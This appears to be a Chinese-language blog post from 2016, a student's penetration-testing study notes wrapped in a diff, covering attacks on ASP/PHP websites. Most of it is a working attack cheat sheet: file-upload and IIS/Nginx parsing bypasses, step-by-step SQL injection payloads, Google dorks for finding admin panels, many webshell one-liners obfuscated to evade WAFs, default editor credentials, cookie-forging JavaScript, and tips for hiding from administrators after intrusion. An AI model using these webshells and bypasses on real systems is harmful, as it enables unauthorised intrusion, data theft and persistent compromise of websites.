@@ -1,0 +1,239 @@
+<!DOCTYPE HTML>
+<html>
+<head>
+  <meta charset="utf-8">
+  
+  <title>渗透学习第一阶段总结[1] | xiaofeng&#39;s Blog</title>
+  <meta name="author" content="xiaofeng">
+  
+  <meta name="description" content="写在前面的话学习渗透有一段时间了，差不多3个月的时间基础课程的学习已经差不多了，外加上自己平时乱倒弄，把平时学习的笔记和自己小本子上的内容抽时间整理了一下。虽然还是一个什么都不太会的渗透小渣渣，但么学习一段时间做一次小总结，这几个月学习了很多东西，渗透这块一直没有发过总结，这几天由于学校考试，学习状">
+  
+  
+  <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">
+
+  <meta property="og:title" content="渗透学习第一阶段总结[1]"/>
+  <meta property="og:site_name" content="xiaofeng&#39;s Blog"/>
+
+  
+    <meta property="og:image" content="undefined"/>
+  
+
+  <link href="/favicon.png" rel="icon">
+  <link rel="alternate" href="/atom.xml" title="xiaofeng&#39;s Blog" type="application/atom+xml">
+  <link rel="stylesheet" href="/css/style.css" media="screen" type="text/css">
+  <!--[if lt IE 9]><script src="//html5shiv.googlecode.com/svn/trunk/html5.js"></script><![endif]-->
+  
+
+<a href="https://github.com/xiaofengtongxue/xiaofengtongxue.github.io.git" target="_blank">
+<img style="position: absolute; top: 0; left: 0; border: 0;" src="https://s3.amazonaws.com/github/ribbons/forkme_left_white_ffffff.png" alt="Fork me on GitHub">
+</a>
+</head>
+
+
+<body>
+  <header id="header" class="inner"><div class="alignleft">
+  <h1><a href="/">xiaofeng&#39;s Blog</a></h1>
+  <h2><a href="/">一个不抽烟 不喝酒的少年</a></h2>
+</div>
+<nav id="main-nav" class="alignright">
+  <ul>
+    
+      <li><a href="/">Home</a></li>
+    
+      <li><a href="/archives">Archives</a></li>
+    
+      <li><a href="//about">About</a></li>
+    
+  </ul>
+  <div class="clearfix"></div>
+</nav>
+<div class="clearfix"></div>
+</header>
+  <div id="content" class="inner">
+    <div id="main-col" class="alignleft"><div id="wrapper"><article class="post">
+  
+  <div class="post-content">
+    <header>
+      
+        <div class="icon"></div>
+        <time datetime="2016-07-02T12:20:38.000Z"><a href="/2016/07/02/16/">2016-07-02</a></time>
+      
+      
+  
+    <h1 class="title">渗透学习第一阶段总结[1]</h1>
+  
+
+    </header>
+    <div class="entry">
+      
+        <h2 id="写在前面的话"><a href="#写在前面的话" class="headerlink" title="写在前面的话"></a>写在前面的话</h2><h3 id="学习渗透有一段时间了，差不多3个月的时间基础课程的学习已经差不多了，外加上自己平时乱倒弄，把平时学习的笔记和自己小本子上的内容抽时间整理了一下。虽然还是一个什么都不太会的渗透小渣渣，但么学习一段时间做一次小总结，这几个月学习了很多东西，渗透这块一直没有发过总结，这几天由于学校考试，学习状态不是很好，就想起了是不是要总结这样一份文章。说就干，大概发费了2天左右的时间，最后经过整理准备分3部分写。平时看着都挺熟悉的东西，总结下来，是这么的没有思路，做总结过程中，怀疑过自己是不是鱼的记忆（听说过这样一句话：鱼的记忆只有3秒钟），忘得太快。这也许就是我们这一代人中有一小部分人的通病，喜欢好高骛远。。。"><a href="#学习渗透有一段时间了，差不多3个月的时间基础课程的学习已经差不多了，外加上自己平时乱倒弄，把平时学习的笔记和自己小本子上的内容抽时间整理了一下。虽然还是一个什么都不太会的渗透小渣渣，但么学习一段时间做一次小总结，这几个月学习了很多东西，渗透这块一直没有发过总结，这几天由于学校考试，学习状态不是很好，就想起了是不是要总结这样一份文章。说就干，大概发费了2天左右的时间，最后经过整理准备分3部分写。平时看着都挺熟悉的东西，总结下来，是这么的没有思路，做总结过程中，怀疑过自己是不是鱼的记忆（听说过这样一句话：鱼的记忆只有3秒钟），忘得太快。这也许就是我们这一代人中有一小部分人的通病，喜欢好高骛远。。。" class="headerlink" title="学习渗透有一段时间了，差不多3个月的时间基础课程的学习已经差不多了，外加上自己平时乱倒弄，把平时学习的笔记和自己小本子上的内容抽时间整理了一下。虽然还是一个什么都不太会的渗透小渣渣，但么学习一段时间做一次小总结，这几个月学习了很多东西，渗透这块一直没有发过总结，这几天由于学校考试，学习状态不是很好，就想起了是不是要总结这样一份文章。说就干，大概发费了2天左右的时间，最后经过整理准备分3部分写。平时看着都挺熟悉的东西，总结下来，是这么的没有思路，做总结过程中，怀疑过自己是不是鱼的记忆（听说过这样一句话：鱼的记忆只有3秒钟），忘得太快。这也许就是我们这一代人中有一小部分人的通病，喜欢好高骛远。。。"></a>学习渗透有一段时间了，差不多3个月的时间基础课程的学习已经差不多了，外加上自己平时乱倒弄，把平时学习的笔记和自己小本子上的内容抽时间整理了一下。虽然还是一个什么都不太会的渗透小渣渣，但么学习一段时间做一次小总结，这几个月学习了很多东西，渗透这块一直没有发过总结，这几天由于学校考试，学习状态不是很好，就想起了是不是要总结这样一份文章。说就干，大概发费了2天左右的时间，最后经过整理准备分3部分写。平时看着都挺熟悉的东西，总结下来，是这么的没有思路，做总结过程中，怀疑过自己是不是鱼的记忆（听说过这样一句话：鱼的记忆只有3秒钟），忘得太快。这也许就是我们这一代人中有一小部分人的通病，喜欢好高骛远。。。</h3><h3 id="总结的不是多么的好，也许看起来不是太有条理，知识为了让自己以后看以来方便一点，仅此而已，都是网上别人写的加上点自己理解。"><a href="#总结的不是多么的好，也许看起来不是太有条理，知识为了让自己以后看以来方便一点，仅此而已，都是网上别人写的加上点自己理解。" class="headerlink" title="总结的不是多么的好，也许看起来不是太有条理，知识为了让自己以后看以来方便一点，仅此而已，都是网上别人写的加上点自己理解。"></a>总结的不是多么的好，也许看起来不是太有条理，知识为了让自己以后看以来方便一点，仅此而已，都是网上别人写的加上点自己理解。</h3><h2 id="0x00-上传部分"><a href="#0x00-上传部分" class="headerlink" title="0x00 上传部分"></a>0x00 上传部分</h2><p>1.直接上传asp asa jsp cer php aspx htr cdx 格式的木马，不行就利用IIS6.0解析漏洞”:1.asp;1.jpg/1.asp;.jpg/1.asp;jpg/1.asp;.xls<br>2.上传图片木马遇到拦截系统，连图片木马都上传不了，记事本打开图片木马在代码最前面加上gif89a，一般就能逃过拦截系统了。<br>3.上传图片木马把地址复制到数据库备份里备份成asp木马，有时不成功就利用IIs6.0解析漏洞尝试突破。<br>4.上传图片木马再用抓包工具进行抓包，用明小子的综合上传功能，复制上传地址及cookies填到对应的框里，点击上传即可。<br>5.当后台有数据库备份蛋没有上传点时，把一句话木马插到任意处，再到数据库备份里备份成asp木马，之后用一句话客户端连接木马即可。<br>6.后台点击修改密码，新密码设置为：1”:eval request(“h”)’设置成功后连接asp/config.asp即可拿下shell<br>7.当页面提示“上传格式不正确[重新上传]” 则说明存在上传漏洞，复制地址放到明小子里上传，一般都能直接拿下shell。<br>8.当后台没有数据库备份但有数据库恢复的情况下，请不要犹豫，数据库恢复跟数据库备份功能是一样的，直接邪恶吧。<br>9.如果知道网站的数据库是asp的，直接在前台找留言板插入一句话木马，连接配置文件inc/config.asp即可拿下shell。<br>10.当网站前台有“会员注册” 注册一个账户进去看看有没有上传点，有的话直接上传asp木马以及利用iis6.0解析漏洞，不行就抓包用明小子上传。<br>11.先上传一个.ashx的文件，在笔记里搜索可找到方法，结果是访问会生成一句话木马文件，后台上传、编辑器上传、上传漏洞页面均可使用此方法。<br>12.当页面提示只能上传jpg|gif|png等格式的时候，右键查看源文件，本地修改为asp|asa|php再本地上传即可拿下shell。<br>13.当用啊D检测注入点提示SA权限或DB权限的时候，尝试列目录找到网站物理路径，再点击cmd/上传，直接上传asp木马即可，不行就差异备份拿shell。<br>14.对于一些上传漏洞的上传页面，以及后台找到的上传页面，可以尝试用本地双文件上传突破，第一个选jpg第二个选cer，推荐使用火狐浏览器。</p>
+<h2 id="0x01-渗透技巧"><a href="#0x01-渗透技巧" class="headerlink" title="0x01 渗透技巧"></a>0x01 渗透技巧</h2><p>1.某些cms的网站设置过滤不严，直接在网站后面加上admin/session.asp 或 admin/left.asp 可以绕过后台验证直接进去后台。<br>2.提下服务器之后建议抓下管理员哈希值，然后删除所有用户包括自己的，以后登录这台服务器就用管理员的账号密码登录，这样比较安全。<br>3.入侵网站之前连接下3389，可以连接上的话先尝试弱口令，不行就按5次shift键，看看有没有shift后门。<br>4.访问后台地址时弹出提示框“请登陆” 把地址记出来(复制不了)放到“网页源代码分析器”里，选择浏览器-拦截跳转勾选–查看即可直接进入后台。<br>5.突破防盗链系统访问shell代码：javascript:document.write(“<a href="http://www.xxx.com/uploadfile/1.asp" target="_blank" rel="external">fuck</a>“) 点击GO即可进入shell。<br>6.遇到一流信息监控拦截系统时，上传图片木马或是在木马代码最前面加上gif89a即可逃过检测。<br>7.eweb编辑器后台，增加了asp|asa|cer|php|aspx等扩展名上传时都被过滤了，尝试增加一个aaspsp，再上传asp就会解析了。<br>8.用注入工具猜解到表段却猜解不到字段的时候，到网站后台右键查看源文件，一般账号密码后面的就是字段，之后在注入工具里添加字段进行猜解即可。<br>9.当注入工具猜解表段，但猜解字段时提示长度超过50之类，不妨扔到穿山甲去猜解一下。<br>10.得知表段跟字段之后，使用SQL语句在ACCESS数据库里加个用户名及密码的语句：Insert into admin(user,pwd) values(‘jianmei’,’daxia’)<br>11.当获得管理员密码却不知道管理员帐号时，到网站前台找新闻链接，一般“提交者”“发布者”的名字就是管理员的帐号了。<br>12.爆破ASP+IIS架设的网站web绝对路径，假设网站主页为：<a href="http://www.xxxxx/index.asp/" target="_blank" rel="external">http://www.xxxxx/index.asp/</a> 提交<a href="http://www.xxxxx.cn/fkbhvv.aspx/，fkbhvv.aspx是不存在的。" target="_blank" rel="external">http://www.xxxxx.cn/fkbhvv.aspx/，fkbhvv.aspx是不存在的。</a><br>13.有的站长很懒什么也不改，当我们得知网站的cms的时候，不妨去下载一套找找数据库路径，以及敏感信息，再尝试默认相关的可利用资源。<br>14.菜刀里点击一句话木马右键，选择虚拟机终端，执行命令出现乱码时，返回去设置编码那里，将默认的GB2312改为UTF-8.<br>15.入侵千万别忘了ftp，试试诺口令，ftp的默认端口：21  默认帐号密码：test<br>16.破解出md5为20位结果，只需要把前三位和后一位去掉，剩余16位拿去解密即可<br>17.好多网站的后台地址是：admin_index.asp manage_login.asp<br>18.有时在木马代码里加上了gif89a，上传成功访问的时候却出现了像图片一样的错误图像，说明服务器把gif89a当做图片来处理了，不要带gif89a即可。问就可以了。<br>19.找eweb编辑器的时候，如果默认的被改了，到前台去找图片右键看下路径，根据图片的目录猜eweb编辑器的目录，后台也是用此思路。<br>20.IIS注册表全版本泄漏用户路径和FTP用户名漏洞：HKEY_LOCAL_MACHINE\SYSTEM\ControlSet002\Services\MSFtpsvc\Parameters\Virtual Roots\<br>21.扫旁站的时候，是不是想看每个站点是什么cms呢？用轩辕剑扫描就可以显示系统特征。<br>22.网站的主站一般都很安全，这时就要旁注或C段了，但是想知道各个IP段开放了什么端口吗？用“啊D网络工具包”里面的IP端口扫描最理想了。<br>23.手工检测注入点弹出“你的操作已被记录!”之类的信息，访问这个文件：sqlin.asp，如果存在，在注入点后面植入一句话木马：‘excute(request(“TNT”))<br>接着用一句话木马客户端连接：<a href="http://www.xxx.com/sqlin.asp，上传木马即可拿下shell，因为很多防注入程序都是用”sqlin.asp“这个文件名来做非法记录的数据库。" target="_blank" rel="external">http://www.xxx.com/sqlin.asp，上传木马即可拿下shell，因为很多防注入程序都是用”sqlin.asp“这个文件名来做非法记录的数据库。</a><br>24.有的后台不显示验证码，往注册表里添加一个ceg即可突破这个困境了，把下面的代码保存为Code.reg，双击导入就可以了。REGEDIT4[HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Internet Explorer\Security]”BlockXBM”=dword:00000000<br>25.内网渗透时尽量少登录3389，以免被管理员发现；<br>26.旁注的时候，建议挑php的站点来日，因为php站点一般都支持aspx脚本，这样对于提权跟跨目录都轻松.!</p>
+<h2 id="0x02-手工注入"><a href="#0x02-手工注入" class="headerlink" title="0x02 手工注入"></a>0x02 手工注入</h2><p>IE浏览器-工具-Internet选项-高级-显示友好HTTP错误信息前面的勾去掉，否则不论服务器返回什么错误，IE都只显示为HTTP 500服务器错误，不能获得更多的信息。<br>手工注入时如果网站过滤了 and 1=1  and 1=2 ，可以用xor 1=1  xor 1=2 进行判断。</p>
+<h3 id="第一步：找注入点"><a href="#第一步：找注入点" class="headerlink" title="第一步：找注入点"></a>第一步：找注入点</h3><p>（数字型）<a href="http://www.xxx.com/show.asp?id=7" target="_blank" rel="external">http://www.xxx.com/show.asp?id=7</a><br>加’           程序报错<br>加and 1=1     返回正常页面<br>加and 1=2     返回错误页面<br>（字符型）<a href="http://www.xxx.com/show.asp?id=ade7" target="_blank" rel="external">http://www.xxx.com/show.asp?id=ade7</a><br>加’            程序报错<br>加’and ‘1’=’1  返回正常页面<br>加’and ‘1’=’2  返回错误页面<br>新型检测注入点的方法：<br>在URL地址后面加上-1，若返回的页面和前面不同，是另一个正常的页面，则表示存在注入漏洞，而且是数字型的注入漏洞。<br>在URL地址后面加上-0，若返回的页面和之前的页面相同，然后加上-1，返回错误页面，则也表示存在注入漏洞，而且是数字型的。<br>如果报错提示这个：<br>Microsoft JET Database Engine 错误 ‘80040e14’<br>语法错误 (操作符丢失) 在查询表达式 ‘ID = 6 ord by’ 中。<br>/fun/Function.asp，行 657<br>解明：通过 JET 引擎连接数据库，则是 Access数据库，通过 ODBC 引擎连接数据库，则是 MSSQL数据库。</p>
+<h3 id="第二步：猜字段数"><a href="#第二步：猜字段数" class="headerlink" title="第二步：猜字段数"></a>第二步：猜字段数</h3><p>语句：order by 5<br>如果猜6的时候返回出错，就继续往回猜，直到返回正确为止…</p>
+<h3 id="第三步：UNION命令"><a href="#第三步：UNION命令" class="headerlink" title="第三步：UNION命令"></a>第三步：UNION命令</h3><p>语句：and 1=2 union select 1,2,3,4,5–<br>看看哪里可以替换，假如显示有2，就在2这里替换SCHEMA_NAME，见下</p>
+<h3 id="第三步：猜库名"><a href="#第三步：猜库名" class="headerlink" title="第三步：猜库名"></a>第三步：猜库名</h3><p>语句：and 1=2 union select 1,SCHEMA_NAME,3,4,5 from information_schema.SCHEMATA limit 1,1</p>
+<h3 id="第四步：猜表段"><a href="#第四步：猜表段" class="headerlink" title="第四步：猜表段"></a>第四步：猜表段</h3><p>语句：and 1=2 union select 1,TABLE_NAME,3,4,5 from information_schema.TABLES where TABLE_SCHEMA=0x68667A7338383838 limit 1,1<br>注意，TABLE_SCHEMA=后面的库名必须是hex转换过的格式，倒数第二个1一直替换，直到爆出所有表段，然后选最可能性的那个。</p>
+<h3 id="第五步：猜字段"><a href="#第五步：猜字段" class="headerlink" title="第五步：猜字段"></a>第五步：猜字段</h3><p>and 1=2 union select 1,COLUMN_NAME,3,4,5 from  information_schema.COLUMNS where TABLE_NAME=0x615F61646D696E limit 1,1<br>注意，TABLE_SCHEMA=后面的表段必须是hex转换过的格式，倒数第二个1一直替换，直到爆出所有字段，然后选最可能性的那两个。</p>
+<h3 id="第六步：猜内容"><a href="#第六步：猜内容" class="headerlink" title="第六步：猜内容"></a>第六步：猜内容</h3><p>语句一：and 1=2 union select 1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26 from admin<br>首先让程序报错，所以在注入点后面加上 and 1=2<br>语句二：<a href="http://www.xxx.com/show.asp?id=-178" target="_blank" rel="external">http://www.xxx.com/show.asp?id=-178</a> union select 1,2,3,4,5,6,7,8,9,10,11,12 from admin<br>同样是先让程序报错，在178这个参数前面加上 -<br>当列名帐号跟列名密码都猜解对的时候，页面将会显示相对应的内容，一般的密码都经过MD5加密了，解密地址：<a href="http://www.cmd5.com/" target="_blank" rel="external">http://www.cmd5.com/</a>   UserName  Password</p>
+<h2 id="0x03-常见网站程序"><a href="#0x03-常见网站程序" class="headerlink" title="0x03 常见网站程序"></a>0x03 常见网站程序</h2><p>asp类:foosun(风讯) kesion(科汛) newasp(新云) 乔客 CreateLive(创力) 5uCMS KingCMS DvBBS(动网) BBSxp [博客]zblog [博客]pjblog<br>PHP类:DeDeCms（织梦）ECMS（帝国）PHPCMS PHP168 HBcms（宏博）SupeSite CMSware(思维) Joomla [BBS]Discuz! [BBS]phpWind [SNS]UCenterHome [SNS]ThinkSNS [商城]EcShop [商城]ShopEx [博客]WordPress [维基]HDWiki [微博]PHPsay [DIGG]PBdigg</p>
+<p>( php开源mysql绝对路径 )<br>开源系统             数据库配置文件名                  文件名所在的目录<br>Discuz!              config.inc.php                    ./ config.inc.php<br>Phpcms               config.inc.php                    ./include/config.inc.php<br>Wodpress             wp-config.php                     ./ wp-config.php<br>Phpwind              sqlconfig.php                     ./data/sqlconfig.php<br>phpweb               config.inc.php                    ./config.inc.php<br>Php168v6             mysql_config.php                  ./php168/ mysql_config.php<br>Shopex               config.php                        ./config/config.php<br>Ecshop               config.php                        ./data/config.php<br>Joomla               configuration.php                 ./ configuration.php<br>UCenter              config.inc.php                    ./data/config.inc.php<br>EmpireCMS            config.php                        ./e/class/config.php<br>Dedecms              common.inc.php                    .data/common.inc.php<br>Zen Cart             configure.php                     ./includes/configure.php<br>Mediawiki            localsettints.php                 ./config/localsettints.php<br>Ecshop               config.php                        ./data/config.php<br>osCommerce           configure.php                     ./includes/configure.php</p>
+<h2 id="0x03-谷歌黑客语法"><a href="#0x03-谷歌黑客语法" class="headerlink" title="0x03 谷歌黑客语法"></a>0x03 谷歌黑客语法</h2><p>site：可以限制你搜索范围的域名.<br>inurl：用于搜索网页上包含的URL，这个语法对寻找网页上的搜索，帮助之类的很有用.<br>intext: 只搜索网页<body>部分中包含的文字(也就是忽略了标题、URL等的文字)<br>intitle: 查包含关键词的页面，一般用于社工别人的webshell密码<br>filetype：搜索文件的后缀或者扩展名<br>intitle：限制你搜索的网页标题.<br>link: 可以得到一个所有包含了某个指定URL的页面列表.<br>查找后台地址：site:域名 inurl:login|admin|manage|member|admin_login|login_admin|system|login|user|main|cms<br>查找文本内容：site:域名 intext:管理|后台|登陆|用户名|密码|验证码|系统|帐号|admin|login|sys|managetem|password|username<br>查找可注入点：site:域名 inurl:aspx|jsp|php|asp<br>查找上传漏洞：site:域名 inurl:file|load|editor|Files<br>找eweb编辑器：site:域名 inurl:ewebeditor|editor|uploadfile|eweb|edit<br>存在的数据库：site:域名 filetype:mdb|asp|#<br>查看脚本类型：site:域名 filetype:asp/aspx/php/jsp<br>迂回策略入侵：inurl:cms/data/templates/images/index/ </body></p>
+<h2 id="0x04-一句话木马"><a href="#0x04-一句话木马" class="headerlink" title="0x04 一句话木马"></a>0x04 一句话木马</h2><p>asp一句话木马：&lt;%eval request(“x”)%&gt;<br>php一句话木马：&lt;?php eval($_POST[g]);?&gt;<br>aspx一句话：&lt;%@ Page Language=”Jscript”%&gt;&lt;%eval(Request.Item[“x”],”unsafe”);%&gt;<br>数据库加密一句话(密码a)：┼攠數畣整爠煥敵瑳∨≡┩愾<br>网站配置、版权信息专用一句话：”%&gt;&lt;%Eval Request(x)%&gt;<br>一句话再过护卫神：&lt;%Y=request(“x”)%&gt; &lt;%execute(Y)%&gt;<br>过拦截一句话木马：&lt;% eXEcGlOBaL ReQuEsT(“x”) %&gt;<br>asp闭合型一句话 %&gt;&lt;%eval request(“0o1Znz1ow”)%&gt;&lt;%<br>能过安全狗的解析格式：;hfdjf.;dfd.;dfdfdfd.asp;sdsd.jpg<br>突破安全狗的一句话：&lt;%Y=request(“x”)%&gt; &lt;%eval(Y)%&gt;<br>elong过安全狗的php一句话：&lt;?php  $a = “a”.”s”.”s”.”e”.”r”.”t”;  $a($_POST[cc]);  ?&gt;<br>后台常用写入php一句话（密码x）：</p>
+<pre><code>&lt;? 
+$fp = @fopen(&quot;c.php&quot;, &apos;a&apos;); 
+@fwrite($fp, &apos;&lt;&apos;.&apos;?php&apos;.&quot;\r\n\r\n&quot;.&apos;eval($_POST[x])&apos;.&quot;\r\n\r\n?&quot;.&quot;&gt;\r\n&quot;); 
+@fclose($fp); 
+?&gt;
+</code></pre><p>高强度php一句话：<br>&lt;?php substr(md5($_REQUEST[‘heroes’]),28)==’acd0’&amp;&amp;eval($_REQUEST[‘c’]);?&gt;<br>新型变异PHP一句话(密码b4dboy):<br>($b4dboy = $_POST[‘b4dboy’]) &amp;&amp; @preg_replace(‘/ad/e’,’@’.str_rot13(‘riny’).’($b4dboy)’, ‘add’);<br>突破安全狗的aspx一句话：<br>&lt;%@ Page Language=”C#” ValidateRequest=”false” %&gt;<br>&lt;%try{ System.Reflection.Assembly.Load(Request.BinaryRead(int.Parse(Request.Cookies[“你的密码”].Value))).CreateInstance(“c”, true, System.Reflection.BindingFlags.Default, null, new object[] { this }, null, null); } catch { }%&gt;<br>突破护卫神，保护盾一句话：</p>
+<pre><code>&lt;?php $a = str_replace(x,&quot;&quot;,&quot;axsxxsxexrxxt&quot;);
+$a($_POST[&quot;test&quot;]); ?&gt;
+</code></pre><p>许多网页程序都不允许包含〈%%〉标记符号的内容的文件上传，这样一句话木马就写入不进数据库了。<br>改成：〈scriptlanguage=VBScript runat=server〉execute request(“l”)〈/Script〉<br>这样就避开了使用〈%%〉，保存为.ASP,程序照样执行的效果是一样的。<br>PHP高强度一句话：</p>
+<pre><code>&lt;?php substr(md5($_REQUEST[&apos;x&apos;]),28)==&apos;acd0&apos;&amp;&amp;eval($_REQUEST[&apos;c&apos;]);?&gt;   菜刀连接：/x.php?x=lostwolf  脚本类型：php
+&lt;?php assert($_REQUEST[&quot;c&quot;]);?&gt;    菜刀连接 躲避检测 
+</code></pre><h2 id="0x04-解析漏洞总结"><a href="#0x04-解析漏洞总结" class="headerlink" title="0x04 解析漏洞总结"></a>0x04 解析漏洞总结</h2><p>IIS 6.0<br>目录解析：/xx.asp/xx.jpg  xx.jpg可替换为任意文本文件(e.g. xx.txt)，文本内容为后门代码<br>IIS6.0 会将 xx.jpg 解析为 asp 文件。<br>后缀解析：/xx.asp;.jpg     /xx.asp:.jpg(此处需抓包修改文件名)<br>IIS6.0 都会把此类后缀文件成功解析为 asp 文件。<br>默认解析：/xx.asa    /xx.cer   /xx.cdx<br>IIS6.0 默认的可执行文件除了 asp 还包含这三种<br>此处可联系利用目录解析漏洞 /xx.asa/xx.jpg 或 /xx.cer/xx.jpg 或 xx.asa;.jpg<br>IIS 7.0/IIS 7.5/Nginx <8.03 在默认fast-cgi开启状况下,在一个文件路径(="" xx.jpg)后面加上="" xx.php会将="" xx.jpg="" xx.php="" 解析为="" php="" 文件。="" 常用利用方法：="" 将一张图和一个写入后门代码的文本文件合并="" 将恶意文本写入图片的二进制代码之后，避免破坏图片文件头和尾="" 例如：="" copy="" b="" +="" yy.txt="" a="" xy.jpg="" 即二进制[binary]模式="" 即ascii模式="" xx.jpg正常图片文件="" 内容="" <?php="" fputs(fopen('shell.php','w'),'<?php="" eval($_post[cmd])?="">');?><br>意思为写入一个内容为 &lt;?php eval($_POST[cmd])?&gt; 名称为shell.php的文件，找个地方上传 xy.jpg ,然后找到 xy.jpg 的地址，在地址后加上 /xx.php 即可执行恶意文本。然后就在图片目录下生成一句话木马 shell.php 密码 cmd </8.03></p>
+<h2 id="0x05-ewebeditor编辑器"><a href="#0x05-ewebeditor编辑器" class="headerlink" title="0x05 ewebeditor编辑器"></a>0x05 ewebeditor编辑器</h2><p>默认后台：ewebeditor/admin_login.asp<br>帐号密码：admin admin<br>样式设计：ewebeditor/admin_style.asp<br>查看版本：ewebeditor/dialog/about.html<br>数据库路径：db/ewebeditor.mdb    db/%23ewebeditor.mdb    db/%23ewebeditor.asp  ewebeditor/db/!@#ewebeditor.asp (用谷歌语法找文件名)<br>遍历目录：ewebeditor/admin/upload.asp?id=16&amp;d_viewmode=&amp;dir =../..<br>跳转目录：ewebeditor/admin_uoloadfile.asp？id=14&amp;dir=..  (dir为列目录, ..为返回上层目录)，形式:dir ../..<br>点上传文件管理-随便选择一个样式目录，得到：ewindoweditor/admin_uoloadfile.asp?id=14 在id=14后面加&amp;dir=../../../.. 就可看到整个网站的文件了(../自己加减)<br>( ewebeditor5.5版本 )<br>默认后台：ewebeditor/admin/login.asp<br>帐号密码：admin  198625<br>数据库路径：data/%23sze7xiaohu.mdb<br>遍历目录：ewebeditor/admin/upload.asp?id=16&amp;d_viewmode=&amp;dir=../<br>调用样式上传页面：ewebeditor/ewebeditor.htm?id=body&amp;style=popup<br>( ewebeditor3.8 php版本 )<br>默认后台：eWebEditor/admin/login.php<br>首先随便输入一个帐号和密码，接着系统会提示出错，这时清空浏览器的url，然后输入以下代码后连按三次回车键：</p>
+<pre><code>javascript:alert(document.cookie=”adminuser=”+escape(”admin”));javascript:alert(document.cookie=”adminpass=”+escape(”admin”));javascript:alert(document.cookie=”admindj=”+escape(”1”));  
+</code></pre><p>接着访问文件：ewebeditor/admin/default.php  就可以直接进入后台了。<br>( ewebeditor编辑器exp手册 )<br>有时候什么后缀都上传了，还是不行。就增加一个asp:jpg格式 上传asp:jpg 试试</p>
+<h4 id="一：文件上传成功了，但是访问不成功，说明该目录-比如：-UploadFile-被设置了权限，返回去换成-上传到根目录就行了-增加asp等不行的时候，可以利用解析asp-jpg"><a href="#一：文件上传成功了，但是访问不成功，说明该目录-比如：-UploadFile-被设置了权限，返回去换成-上传到根目录就行了-增加asp等不行的时候，可以利用解析asp-jpg" class="headerlink" title="一：文件上传成功了，但是访问不成功，说明该目录(比如：/UploadFile)被设置了权限，返回去换成/ 上传到根目录就行了.增加asp等不行的时候，可以利用解析asp;jpg"></a>一：文件上传成功了，但是访问不成功，说明该目录(比如：/UploadFile)被设置了权限，返回去换成/ 上传到根目录就行了.增加asp等不行的时候，可以利用解析asp;jpg</h4><h4 id="二：下载数据库查看前人留下的痕迹，再访问上传页面拿shell。"><a href="#二：下载数据库查看前人留下的痕迹，再访问上传页面拿shell。" class="headerlink" title="二：下载数据库查看前人留下的痕迹，再访问上传页面拿shell。"></a>二：下载数据库查看前人留下的痕迹，再访问上传页面拿shell。</h4><p>页面路径：/ewebeditor.asp?id=48&amp;style=popu7 用工具浏览数据库找到已添加asp|asa|cer|php的栏目，把S_ID跟S_Name的值替换在语句里访问，上传相对应的格式木马。</p>
+<h2 id="0x06-fckeditor编辑器"><a href="#0x06-fckeditor编辑器" class="headerlink" title="0x06 fckeditor编辑器"></a>0x06 fckeditor编辑器</h2><p>查看版本：fckeditor/editor/dialog/fck_about.html<br>编辑器页面：FCKeditor/_samples/default.html<br>上传页面：fckeditor/editor/filemanager/connectors/test.html<br>遍历目录：FCKeditor/editor/filemanager/connectors/aspx/connector.aspx?Command=GetFoldersAndFiles&amp;Type=File&amp;CurrentFolder=/<br>编辑页面：fckeditor/editor/filemanager/browser/default/browser.html?Type=Image&amp;Connector=connectors/asp/connector.asp<br>查看文件上传路径：fckeditor/editor/filemanager/browser/default/connectors/asp/connector.asp?Command=GetFoldersAndFiles&amp;Type=Image&amp;CurrentFolder=<br>( 拿shell方法总结 )<br>ASPX的站几乎都用fck编辑器，建议用工具扫一下，记住inc目录下可能存在fck编辑器，扫下这个目录。</p>
+<h4 id="一：如果是iis6-0，上传两次-1-asp-jpg-或者1-asp-1-jpg-或者创建x-asp目录，再在这个目录下上传x-jpg-或者直接上传1-asp-jpg-都可以完美解析拿下shell"><a href="#一：如果是iis6-0，上传两次-1-asp-jpg-或者1-asp-1-jpg-或者创建x-asp目录，再在这个目录下上传x-jpg-或者直接上传1-asp-jpg-都可以完美解析拿下shell" class="headerlink" title="一：如果是iis6.0，上传两次 1.asp;.jpg 或者1.asp;1.jpg 或者创建x.asp目录，再在这个目录下上传x.jpg 或者直接上传1.asp;jpg 都可以完美解析拿下shell"></a>一：如果是iis6.0，上传两次 1.asp;.jpg 或者1.asp;1.jpg 或者创建x.asp目录，再在这个目录下上传x.jpg 或者直接上传1.asp;jpg 都可以完美解析拿下shell</h4><h4 id="二：第一次上传1-asp-1-jpg，被重命名为：1-asp-1-jpg，但是第二次上传1-asp-1-jpg，就有可能变成：1-asp-1-1-jpg"><a href="#二：第一次上传1-asp-1-jpg，被重命名为：1-asp-1-jpg，但是第二次上传1-asp-1-jpg，就有可能变成：1-asp-1-1-jpg" class="headerlink" title="二：第一次上传1.asp;1.jpg，被重命名为：1_asp;1.jpg，但是第二次上传1.asp;1.jpg，就有可能变成：1.asp;1(1).jpg"></a>二：第一次上传1.asp;1.jpg，被重命名为：1_asp;1.jpg，但是第二次上传1.asp;1.jpg，就有可能变成：1.asp;1(1).jpg</h4><h4 id="三：iis7-5-fck的解析文件为：a-aspx-a-a-aspx-jpg-jpg-aspx"><a href="#三：iis7-5-fck的解析文件为：a-aspx-a-a-aspx-jpg-jpg-aspx" class="headerlink" title="三：iis7.5+fck的解析文件为：a.aspx.a;.a.aspx.jpg..jpg.aspx"></a>三：iis7.5+fck的解析文件为：a.aspx.a;.a.aspx.jpg..jpg.aspx</h4><h4 id="四：如果不是iis6-0-上传1-asp-jpg然后抓包，接下来改包，将分号变成空格，再用c32把20改成00，保存，利用-00-截断分号两次"><a href="#四：如果不是iis6-0-上传1-asp-jpg然后抓包，接下来改包，将分号变成空格，再用c32把20改成00，保存，利用-00-截断分号两次" class="headerlink" title="四：如果不是iis6.0 上传1.asp;jpg然后抓包，接下来改包，将分号变成空格，再用c32把20改成00，保存，利用%00 截断分号两次"></a>四：如果不是iis6.0 上传1.asp;jpg然后抓包，接下来改包，将分号变成空格，再用c32把20改成00，保存，利用%00 截断分号两次</h4><h4 id="五：成功访问别人的一句话木马页面，http-glavesoft-com-UploadFiles-EditorFile-file-2-asp-2-1-jpg-但不知道密码"><a href="#五：成功访问别人的一句话木马页面，http-glavesoft-com-UploadFiles-EditorFile-file-2-asp-2-1-jpg-但不知道密码" class="headerlink" title="五：成功访问别人的一句话木马页面，http://glavesoft.com/UploadFiles\EditorFile\file/2.asp;2(1).jpg  